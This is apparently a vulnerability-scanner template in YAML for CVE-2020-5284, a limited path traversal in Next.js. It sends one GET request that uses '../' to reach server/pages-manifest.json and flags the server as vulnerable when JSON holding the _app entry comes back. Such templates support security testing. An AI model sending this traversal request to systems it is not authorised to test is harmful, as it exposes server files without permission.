id: CVE-2020-5284

info:
    name: Next.js .next limited path traversal
    author: x1n9Qi8
    severity: medium

rules:
    r0:
        request:
            method: GET
            path: /_next/static/../server/pages-manifest.json
        expression: 'response.status == 200 && response.headers["content-type"].contains("application/json") && "/_app\": \".*?_app\\.js".bmatches(response.body)'
expression: r0()